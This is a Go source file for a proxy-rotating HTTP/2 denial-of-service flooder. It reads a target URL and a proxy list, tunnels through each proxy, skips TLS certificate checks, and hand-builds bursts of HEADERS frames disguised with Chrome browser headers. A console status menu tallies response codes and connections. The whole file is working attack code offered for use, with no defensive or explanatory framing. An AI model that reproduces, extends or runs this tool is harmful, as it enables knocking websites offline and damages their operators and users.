package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2/hpack"
)

var (
	t_hostname string
	t_path     string
	t_port     int

	rate    int
	secs    int
	thr     int
	proxies [][2]string
)

func init() {
	var proxyFile, t_url string
	flag.StringVar(&t_url, "u", "", "target url")
	flag.IntVar(&rate, "r", 64, "requests per conn")
	flag.IntVar(&secs, "s", 60, "duration")
	flag.IntVar(&thr, "t", 1, "thread count")
	flag.StringVar(&proxyFile, "p", "", "proxies.txt")
	flag.Parse()
	if t_url == "" || proxyFile == "" {
		fmt.Println("invalid url or proxies")
		os.Exit(1)
	}
	parsed_url, err := url.Parse(t_url)
	if err != nil {
		fmt.Println("Failed to parse url")
		os.Exit(1)
	}
	t_hostname = parsed_url.Hostname()
	t_path = parsed_url.RequestURI()
	if parsed_url.Port() == "" {
		t_port = 443
	} else {
		t_port, err = strconv.Atoi(parsed_url.Port())
		if err != nil {
			fmt.Println("invalid port in url")
			os.Exit(1)
		}
	}
	fileData, err := os.ReadFile(proxyFile)
	if err != nil {
		fmt.Println("failed to open file with proxies")
		os.Exit(1)
	}
	proxyList := strings.Split(strings.ReplaceAll(strings.TrimSpace(string(fileData)), "\r\n", "\n"), "\n")
	if len(proxyList) < 1 {
		fmt.Println("failed to parse proxies from file")
	}
	for _, p := range proxyList {
		//fmt.Println("checking", p)
		if len(strings.Split(p, ":")) != 2 && len(strings.Split(p, ":")) != 4 {
			//DEV DEBUG
			//fmt.Printf("proxy: %s | len parts: %d\r\n", p, len(strings.Split(p, ":")))
			//DEV DEBUG
			continue
		}
		if len(strings.Split(p, ":")) == 2 {
			proxies = append(proxies, [2]string{p, ""})
			//DEV DEBUG
			//fmt.Println("Added: ", p)
			//DEV DEBUG
		} else if len(strings.Split(p, ":")) == 4 {
			ptp := strings.Split(p, ":")
			pth := fmt.Sprintf("%s:%s", ptp[0], ptp[1])
			ptc := fmt.Sprintf("%s:%s", ptp[2], ptp[3])
			proxies = append(proxies, [2]string{pth, fmt.Sprintf("Basic %s", base64.StdEncoding.EncodeToString([]byte(ptc)))})
		}
	}
	if len(proxies) < 1 {
		fmt.Println("no valid proxies provided")
		os.Exit(1)
	}
}

func main() {
	for i := 0; i < thr; i++ {
		go flooder(t_hostname, t_path, t_port)
	}
	go func() {
		started := time.Now()
		for {
			time.Sleep(time.Duration(1) * time.Second)
			statusString := fmt.Sprintf("\x1bc\x1b[H%s | LEFT: %ds\r\nSTATUS MENU:\r\n  rps: %d\r\n  ", time.Now().Format("02.01.2006 15:04:05"), int((time.Duration(secs)*time.Second - time.Since(started)).Seconds()), rps)
			if s200 > 0 {
				statusString = fmt.Sprintf("%s200: %d\r\n  ", statusString, s200)
			}
			if s201 > 0 {
				statusString = fmt.Sprintf("%s201: %d\r\n  ", statusString, s201)
			}
			if s301 > 0 {
				statusString = fmt.Sprintf("%s301: %d\r\n  ", statusString, s301)
			}
			if s302 > 0 {
				statusString = fmt.Sprintf("%s302: %d\r\n  ", statusString, s302)
			}
			if s304 > 0 {
				statusString = fmt.Sprintf("%s304: %d\r\n  ", statusString, s304)
			}
			if s400 > 0 {
				statusString = fmt.Sprintf("%s400: %d\r\n  ", statusString, s400)
			}
			if s403 > 0 {
				statusString = fmt.Sprintf("%s403: %d\r\n  ", statusString, s403)
			}
			if s404 > 0 {
				statusString = fmt.Sprintf("%s404: %d\r\n  ", statusString, s404)
			}
			if s429 > 0 {
				statusString = fmt.Sprintf("%s429: %d\r\n  ", statusString, s429)
			}
			if s500 > 0 {
				statusString = fmt.Sprintf("%s500: %d\r\n  ", statusString, s500)
			}
			if s502 > 0 {
				statusString = fmt.Sprintf("%s200: %d\r\n  ", statusString, s502)
			}
			if s503 > 0 {
				statusString = fmt.Sprintf("%s503: %d\r\n  ", statusString, s503)
			}
			if s504 > 0 {
				statusString = fmt.Sprintf("%s504: %d\r\n  ", statusString, s504)
			}
			if s525 > 0 {
				statusString = fmt.Sprintf("%s525: %d\r\n  ", statusString, s525)
			}
			if goaway > 0 {
				statusString = fmt.Sprintf("%sGOAWAY: %d\r\n  ", statusString, goaway)
			}
			statusString = fmt.Sprintf("%sConnections: %d", statusString, connsAlive)
			fmt.Println(statusString)
			atomic.StoreUint64(&rps, 0)
			atomic.StoreUint64(&s200, 0)
			atomic.StoreUint64(&s201, 0)
			atomic.StoreUint64(&s301, 0)
			atomic.StoreUint64(&s302, 0)
			atomic.StoreUint64(&s304, 0)
			atomic.StoreUint64(&s400, 0)
			atomic.StoreUint64(&s403, 0)
			atomic.StoreUint64(&s404, 0)
			atomic.StoreUint64(&s429, 0)
			atomic.StoreUint64(&s500, 0)
			atomic.StoreUint64(&s502, 0)
			atomic.StoreUint64(&s503, 0)
			atomic.StoreUint64(&s504, 0)
			atomic.StoreUint64(&s525, 0)
			atomic.StoreUint64(&goaway, 0)
		}
	}()
	time.Sleep(time.Duration(secs) * time.Second)
}

var (
	rps        uint64
	s200       uint64
	s201       uint64
	s301       uint64
	s302       uint64
	s304       uint64
	s400       uint64
	s403       uint64
	s404       uint64
	s429       uint64
	s500       uint64
	s502       uint64
	s503       uint64
	s504       uint64
	s525       uint64
	goaway     uint64
	connsAlive uint64
)

func flooder(hostname, path string, port int) {
	//DEV DEBUG
	//fmt.Println("new flooder started")
	//DEV DEBUG
	started := time.Now()
	dur := time.Duration(secs) * time.Second
	headers := [][2]string{
		{":authority", hostname},
		{":method", "GET"},
		{":path", path},
		{":scheme", "https"},
		{"accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
		{"accept-encoding", "gzip, deflate, br, zstd"},
		{"accept-language", "ru"},
		{"cache-control", "no-cache"},
		{"pragma", "no-cache"},
		{"priority", "u=0, i"},
		{"sec-ch-ua", "\"Not(A:Brand\";v=\"99\", \"Google Chrome\";v=\"133\", \"Chromium\";v=\"133\""},
		{"sec-ch-ua-mobile", "?0"},
		{"sec-ch-ua-platform", "\"Windows\""},
		{"sec-fetch-dest", "document"},
		{"sec-fetch-mode", "navigate"},
		{"sec-fetch-site", "none"},
		{"sec-fetch-user", "?1"},
		{"upgrade-insecure-requests", "1"},
		{"user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"},
	}
	for time.Since(started) < dur {
		for _, p := range proxies {
			var connect []byte
			if p[1] != "" {
				connect = []byte(fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Authorization: %s\r\n\r\n", hostname, port, hostname, port, p[1]))
			} else {
				connect = []byte(fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n", hostname, port, hostname, port))
			}
			conn, err := net.DialTimeout("tcp", p[0], time.Duration(3)*time.Second)
			if err != nil {
				//DEV DEBUG
				//fmt.Println(err)
				//fmt.Println("proxy conn err")
				//DEV DEBUG
				continue
			}
			atomic.AddUint64(&connsAlive, 1)
			_, err = conn.Write(connect)
			if err != nil {
				//DEV DEBUG
				//fmt.Println(err)
				//fmt.Println("proxy conn err")
				//DEV DEBUG
				atomic.AddUint64(&connsAlive, ^uint64(0))
				conn.Close()
				continue
			}
			buf := make([]byte, 1024)
			n, err := conn.Read(buf)
			if err != nil {
				//DEV DEBUG
				//fmt.Println(err)
				//fmt.Println("proxy conn err")
				//DEV DEBUG
				atomic.AddUint64(&connsAlive, ^uint64(0))
				conn.Close()
				continue
			}
			if !strings.Contains(string(buf[:n]), " 200 ") {
				//DEV DEBUG
				//fmt.Println("NOT FOUND CODE 200")
				//fmt.Println("proxy conn err, invalid code")
				//DEV DEBUG
				atomic.AddUint64(&connsAlive, ^uint64(0))
				conn.Close()
				continue
			}
			conf := &tls.Config{ServerName: hostname, NextProtos: []string{"h2"}, InsecureSkipVerify: true}
			wrapped := tls.Client(conn, conf)
			err = wrapped.Handshake()
			if err != nil {
				//DEV DEBUG
				//fmt.Println(err)
				//DEV DEBUG
				atomic.AddUint64(&connsAlive, ^uint64(0))
				wrapped.Close()
				continue
			}
			if _, err := wrapped.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")); err != nil {
				//DEV DEBUG
				//fmt.Println(err)
				//DEV DEBUG
				atomic.AddUint64(&connsAlive, ^uint64(0))
				wrapped.Close()
				continue
			}
			if _, err := wrapped.Write([]byte{0x00, 0x00, 0x18, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00,
				0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x60, 0x00, 0x00, 0x00, 0x06, 0x00, 0x04, 0x00,
				0x00, 0x00, 0x00, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff}); err != nil {
				//DEV DEBUG
				//fmt.Println(err)
				//DEV DEBUG
				atomic.AddUint64(&connsAlive, ^uint64(0))
				wrapped.Close()
				continue
			}
			buf = make([]byte, 1024)
			n, err = wrapped.Read(buf)
			if err != nil {
				//DEV DEBUG
				//fmt.Println(err)
				//DEV DEBUG
				atomic.AddUint64(&connsAlive, ^uint64(0))
				wrapped.Close()
				continue
			}
			if buf[:n][3] != 0x04 || n < 9 {
				//DEV DEBUG
				//fmt.Println("invalid frame type or len")
				//DEV DEBUG
				atomic.AddUint64(&connsAlive, ^uint64(0))
				wrapped.Close()
				continue
			}
			if _, err := wrapped.Write([]byte{0x00, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00}); err != nil {
				//DEV DEBUG
				//fmt.Println(err)
				//DEV DEBUG
				atomic.AddUint64(&connsAlive, ^uint64(0))
				wrapped.Close()
				continue
			}
			var hBuf bytes.Buffer
			var fbuf bytes.Buffer
			var rqs int
			enc := hpack.NewEncoder(&hBuf)
			enc.SetMaxDynamicTableSize(65536)
			go func(maxStreamID, rate int, w *tls.Conn) {
				closed_streams := 0
				dec := hpack.NewDecoder(65536, nil)
				for closed_streams < rate {
					w.SetReadDeadline(time.Now().Add(time.Duration(3) * time.Second))
					header := make([]byte, 9)
					_, err := io.ReadFull(w, header)
					if err != nil {
						//DEV DEBUG
						//fmt.Println(err)
						//DEV DEBUG
						atomic.AddUint64(&connsAlive, ^uint64(0))
						w.Close()
						return
					}
					plen := int(binary.BigEndian.Uint32(append([]byte{0}, header[:3]...)))
					ftype := header[3]
					flags := header[4]
					if ftype == 0x7 {
						//DEV DEBUG
						//fmt.Println("goaway")
						//DEV DEBUG
						atomic.AddUint64(&connsAlive, ^uint64(0))
						atomic.AddUint64(&goaway, 1)
						w.Close()
						return
					}
					if flags&0x1 == 0x1 {
						closed_streams++
					}
					w.SetReadDeadline(time.Now().Add(time.Duration(3) * time.Second))
					payload := make([]byte, plen)
					_, err = io.ReadFull(w, payload)
					if err != nil {
						//DEV DEBUG
						//fmt.Println(err)
						//DEV DEBUG
						atomic.AddUint64(&connsAlive, ^uint64(0))
						w.Close()
						return
					}
					if ftype == 0x1 {
						hdrs, err := dec.DecodeFull(payload)
						if err != nil {
							//DEV DEBUG
							//fmt.Println(err)
							//DEV DEBUG
							continue
						}
						scode := 0
						for _, hf := range hdrs {
							if hf.Name == ":status" {
								scode, err = strconv.Atoi(hf.Value)
								if err != nil {
									//DEV DEBUG
									//fmt.Println(err)
									//DEV DEBUG
									break
								}
							}
						}
						switch scode {
						case 200:
							atomic.AddUint64(&s200, 1)
						case 201:
							atomic.AddUint64(&s201, 1)
						case 301:
							atomic.AddUint64(&s301, 1)
						case 302:
							atomic.AddUint64(&s302, 1)
						case 304:
							atomic.AddUint64(&s304, 1)
						case 400:
							atomic.AddUint64(&s400, 1)
						case 403:
							atomic.AddUint64(&s403, 1)
						case 404:
							atomic.AddUint64(&s404, 1)
						case 429:
							atomic.AddUint64(&s429, 1)
						case 500:
							atomic.AddUint64(&s500, 1)
						case 502:
							atomic.AddUint64(&s502, 1)
						case 503:
							atomic.AddUint64(&s503, 1)
						case 504:
							atomic.AddUint64(&s504, 1)
						case 525:
							atomic.AddUint64(&s525, 1)
						}
					}
				}
				w.Close()
				atomic.AddUint64(&connsAlive, ^uint64(0))
			}(rate*2-1, rate, wrapped)
			for streamID := uint32(1); streamID < uint32(rate)*2; streamID += 2 {
				for i := 0; i < len(headers); i++ {
					enc.WriteField(hpack.HeaderField{Name: headers[i][0], Value: headers[i][1]})
				}
				hLen := make([]byte, 4)
				binary.BigEndian.PutUint32(hLen, uint32(len(hBuf.Bytes())))
				bytedStreamID := make([]byte, 4)
				binary.BigEndian.PutUint32(bytedStreamID, streamID&0x7FFFFFFF)
				frame := append(hLen[1:], 0x1, 0x5)
				frame = append(frame, bytedStreamID...)
				frame = append(frame, hBuf.Bytes()...)
				hBuf.Reset()
				if fbuf.Len()+len(frame) > 1400 {
					if _, err := wrapped.Write(fbuf.Bytes()); err != nil {
						//DEV DEBUG
						//fmt.Println(err)
						//DEV DEBUG
						atomic.AddUint64(&rps, uint64(rqs))
						rqs = 0
						fbuf.Reset()
						break
					}
					fbuf.Reset()
					atomic.AddUint64(&rps, uint64(rqs))
					rqs = 0
				}
				fbuf.Write(frame)
				rqs++
			}
			if fbuf.Len() > 0 {
				wrapped.Write(fbuf.Bytes())
				atomic.AddUint64(&rps, uint64(rqs))
				rqs = 0
			}
		}
	}
}
